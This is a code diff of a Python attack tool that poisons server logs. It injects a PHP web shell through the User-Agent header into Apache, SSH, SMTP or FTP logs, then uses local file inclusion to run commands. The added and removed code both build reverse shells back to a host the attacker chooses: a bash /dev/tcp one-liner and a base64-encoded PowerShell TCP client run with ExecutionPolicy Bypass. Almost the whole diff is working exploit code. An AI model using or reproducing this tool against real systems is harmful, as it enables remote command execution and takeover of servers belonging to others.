+			if data_mode == True:
+				dato={indata:ftp_log}
+				data_copy = dict(data)
+				data_copy.update(dato)
+				dato = data_copy
+				requests.request(method, url + '?&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies, data=dato, auth=auth)
+				time.sleep(retry_time)
+			else:
+				requests.request(method,url + ftp_log + '&cmd=' + payload, cookies=cookies, headers=headers, proxies=proxies, data=data, auth=auth)
+				time.sleep(retry_time)
+		except KeyboardInterrupt:
 			sys.exit(1)
 
-def windows_apache_log_poison():
+def handler():
 
-	print ("💀 Bulding encoded payload")
-	build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + attacker_ip + "'," + attacker_port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
-	bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
-	base64payload = bytes_encoded.decode()
-	payload = ('powershell.exe%20-ExecutionPolicy%20Bypass%20-e%20' + base64payload)
-	print ("💀 Poison " + windows_apache_file_to_poison)
-	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
-	print ("💀 Sending payload\n")
-	
-	if ck == True:
-	
-		requests.get(url, cookies={cookie:windows_apache_file_to_poison}, headers=headers)
-	
-	else:
-	
-		requests.get(url + windows_apache_file_to_poison, headers=headers)
-	
-	c = threading.Thread(target=autoconnect)
-	c.start()
-	
-	if ck == True:
-	
-		requests.get(url + '?' + cookie + '=' + windows_apache_file_to_poison + '&cmd=' + payload, cookies={cookie:windows_apache_file_to_poison})
-	
-	else:
-	
-		requests.get(url + windows_apache_file_to_poison + '&cmd=' + payload)
-
-ck = False
-def Main():
-	
-	if len(sys.argv) <= 1:
-
-		Help()
-		sys.exit(1)
-
-	if '-h' in sys.argv or '--help' in sys.argv:
-
-		Help()
-		sys.exit(1)
-
-	parser = []
+	apache_log='/var/log/apache2/access.log'
+	ssh_log='/var/log/auth.log'
+	smtp_log='/var/log/mail.log'
+	ftp_log='/var/log/vsftpd.log'                                      
+	windows_apache_log='C:/xampp/apache/logs/access.log'
+	ssh_port=22
+	smtp_port=25
+	ftp_port=21
+	h = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
+	headers = {}
+	cookies = {}
+	proxies = {}
+	data = {}
+	method = 'GET'
+	cookie = None
+	indata = None
+	log = None
+	user = None
+	passwd = None
+	retry_time = 5
+	cookie_mode = False
+	data_mode = False
+	arguments = []
 	for arg in sys.argv:
-
-		parser.append(arg)
-		
-		if '-u' == arg or '--url' == arg:
-
-			urlp = int(parser.index(arg)+1)
-
-		if '-t' == arg or '--poison-type' == arg:
-
-			typep = int(parser.index(arg)+1)
-
-		if '-r' == arg or '--host' == arg:
-
-			hostp = int(parser.index(arg)+1)
-
-		if '-p' == arg or '--port' == arg:
-
-			portp = int(parser.index(arg)+1)
+		arguments.append(arg)
+	for argument in arguments:
+		try:	  
+			if argument == '-u' or argument == '--url':
+				n = arguments.index(argument)+1
+				url = arguments[n]
+			if argument == '-r' or argument == '--host':
+				n = arguments.index(argument)+1
+				attacker_ip = arguments[n]
+			if argument == '-p' or argument == '--port':
+				n = arguments.index(argument)+1
+				attacker_port = arguments[n]				
+			if argument == '-t' or argument == '--poison-type':
+				n = arguments.index(argument)+1
+				poison_type = arguments[n]
+			if argument == '-l' or argument == '--log':
+				n = arguments.index(argument)+1
+				log = arguments[n]
+				apache_log = log
+				ssh_log = log
+				smtp_log = log
+				ftp_log = log
+				windows_apache_log = log				
+			if argument == '--cookie-mode':
+				n = arguments.index(argument)+1
+				cookie = arguments[n]
+				cookie_mode = True
+			if argument == '--data-mode':
+				n = arguments.index(argument)+1
+				indata = arguments[n]
+				method = 'POST'
+				data_mode = True
+			if argument == '-X' or argument == '--method': 
+				n = arguments.index(argument)+1
+				method = arguments[n]		
+			if argument == '-d' or argument == '--data':
+				n = arguments.index(argument)+1
+				d = arguments[n]
+				method = 'POST'
+				data = ast.literal_eval(d)
+			if argument == '--ssh-port': 
+				n = arguments.index(argument)+1
+				ssh_port = int(arguments[n])
+			if argument == '--ftp-port': 
+				n = arguments.index(argument)+1
+				ftp_port = int(arguments[n])
+			if argument == '--smtp-port': 
+				n = arguments.index(argument)+1
+				smtp_port = int(arguments[n])
+			if argument == '--delay': 
+				n = arguments.index(argument)+1
+				retry_time = int(arguments[n])
+			if argument == '--basic-auth': 
+				n = arguments.index(argument)+1
+				user = arguments[n]
+				n = arguments.index(argument)+2
+				passwd = arguments[n]	
+			if argument == '--proxy-file':
+				n = arguments.index(argument)+1
+				proxy_file = arguments[n]
+				with open(proxy_file) as f:
+					for p in f:
+						proxies.update({p.split(':')[0]:p.split('://')[1].strip("\n")})						
+			if argument == '--proxy':
+				n = arguments.index(argument)+1
+				proxy = arguments[n]
+				proxy_list = proxy.split(',')
+				for p in proxy_list:					
+					proxies.update({p.split(':')[0].strip(" "):p.split('://')[1]})
+			if argument == '--headers' or argument == '-H':
+				n = arguments.index(argument)+1
+				headers = arguments[n]				
+				headers = ast.literal_eval(headers)							
+			if argument == '--cookies' or argument == '-c':
+				n = arguments.index(argument)+1
+				cookies = arguments[n]
+				cookies = ast.literal_eval(cookies)
+		except IndexError:
+			Help()
+			sys.exit(1)
+	auth = ((user,passwd)) if user or passwd is not None else None	
+	try:
+		target_os = poison_type.split('-')[1]
+		if target_os != 'lin' and target_os != 'win':
+			Help()
+			sys.exit()
+		if target_os == 'lin':
+			payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
+		if target_os == 'win':
+			apache_log = windows_apache_log	
+			ssh_log = 'C:/ProgramData/ssh/logs/sshd.log'
+			ftp_log = 'C:/inetpub/logs/LogFiles/FTPSVC1/u_ex991231.log'
+			smtp_log = 'C:/xampp/MercuryMail/LOGS/MERCURYS.LOG'
+			build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + attacker_ip + "'," + attacker_port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
+			bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
+			base64payload = bytes_encoded.decode()
+			payload = ('powershell.exe%20-ExecutionPolicy%20Bypass%20-e%20' + base64payload)
 			
-		if '-l' == arg or '--log' == arg:
-
-			logp = int(parser.index(arg)+1)
-			
-		if '--cookie' == arg:
-
-			cookiep = int(parser.index(arg)+1)
-
-	global ck
-	global log_poison_type
-	global attacker_ip
-	global attacker_port
-	global url
-	global target_host
-	global apache_file_to_poison
-	global ssh_file_to_poison
-	global smtp_file_to_poison
-	global ftp_file_to_poison
-	global windows_apache_file_to_poison
-	global cookie
-	
-	try:
-	
-		log = parser[logp]
-	
-		apache_file_to_poison = log
-		ssh_file_to_poison = log
-		smtp_file_to_poison = log
-		ftp_file_to_poison = log
-		windows_apache_file_to_poison = log
-	
-	except UnboundLocalError:
+	except IndexError as e:
+		# Forcing the use of filterchain function
+		target_os = ''
+		payload='bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/' + attacker_ip + '/' + attacker_port + '%200>%261%27%26'
 		
-		pass
-	
-	except IndexError:
-	
-		Help()
-		sys.exit(1)
-	
-	try:
-	
-		cookie = parser[cookiep]
-		ck = True
-	
-	except UnboundLocalError:
-	
-		pass
-	
-	except IndexError:
-	
-		Help()
-		sys.exit(1)
-	
-	try:
-	
-		url = parser[urlp]
-		target_host = urlparse(url).netloc
-	
-	except UnboundLocalError:
+	return poison_type,payload,attacker_port,cookie_mode,data_mode,indata,url,auth,log,apache_log,ssh_log,ftp_log,smtp_log,windows_apache_log,cookie,cookies,headers,h,proxies,retry_time,method,data,ssh_port,ftp_port,smtp_port,target_os
 
-		pass
-		
-	except IndexError:
+ua = randomUA()
+o_headers = {'User-Agent':ua}
 
-		Help()
-		sys.exit(1)
-	
-	try:
-		attacker_ip = parser[hostp]
-		
-	except UnboundLocalError:
+poison_type,payload,attacker_port,cookie_mode,data_mode,indata,url,auth,log,apache_log,ssh_log,ftp_log,smtp_log,windows_apache_log,cookie,cookies,headers,h,proxies,retry_time,method,data,ssh_port,ftp_port,smtp_port,target_os = handler()
 
-		pass	
-
-	except IndexError:
-
-		Help()
-		sys.exit(1)
-	
-	try:
-		attacker_port = parser[portp]
-		
-	except UnboundLocalError:
-
-		pass
-		
-	except IndexError:
-
-		Help()
-		sys.exit(1)
+def main():
 
 	try:
-	
-		log_poison_type = parser[typep]
-	
-	except UnboundLocalError:
-
-		pass
-	
-	except IndexError:
-
-		Help()
-		sys.exit(1)
-
-	try:
-
-		if log_poison_type == 'apache':
-		
-			linux_apache_log_poison()
-	
-		elif log_poison_type == 'ssh':
-
-			linux_ssh_log_poison()
-
-		elif log_poison_type == 'smtp':
-
-			linux_smtp_log_poison()
-
-		elif log_poison_type == 'ftp':
-
-			linux_ftp_log_poison()
-
-		elif log_poison_type == 'windows':
-
-			windows_apache_log_poison()
-
+		if poison_type.split('-')[0] == 'apache':
+			apache(headers,payload,attacker_port)
+		elif poison_type.split('-')[0] == 'ssh':
+			ssh(headers,payload,attacker_port)
+		elif poison_type.split('-')[0] == 'smtp':
+			smtp(headers,payload,attacker_port)
+		elif poison_type.split('-')[0] == 'ftp':
+			ftp(headers,payload,attacker_port)
+		elif poison_type == 'filterchain':
+			filterchain(headers,payload,attacker_port)
 		else:
+			print('No poison scheme found')
+	except requests.exceptions.ProxyError:
+		print('ProxyError Unable to connect to proxy: [Errno 111] Connection refused')
+	except requests.exceptions.ConnectionError:
+		print('Failed to establish a new connection: [Errno 111] Connection refused')
+	except ConnectionRefusedError:
+		print('[Errno 111] Connection refused')
 
-			print("No poison scheme found")
 
-	except NameError:
-
-		Help()
-		sys.exit(1)
-
-	except KeyboardInterrupt:
-
-		sys.exit(1)
-
-Main()
+main()
